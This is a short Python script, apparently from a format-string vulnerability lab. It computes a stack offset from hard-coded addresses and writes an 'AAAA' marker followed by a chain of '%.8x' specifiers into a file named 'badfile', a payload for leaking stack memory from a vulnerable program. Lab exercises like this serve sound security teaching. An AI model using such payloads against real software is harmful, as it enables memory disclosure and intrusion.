#! /usr/bin/python3

EBP = 0xffffd298
INP = 0xffffd370

def main():
    # Initialize the content array
    N = 1500
    content = bytearray(0x0 for i in range(N))
    distance = abs(INP - EBP) // 4
    print("The difference between the addresses of the frame pointer and the address of the input buffer (in bytes) is", distance)
    offset = 10
    distance = distance + offset
    print("The number of %x is", distance)
    s = "AAAA " + "%.8x " * distance + "\n"

    fmt  = (s).encode('latin-1')
    content[0:len(fmt)] = fmt

    # Write the content to badfile
    with open('badfile', 'wb') as f:
        f.write(content)

if __name__ == "__main__":
  main()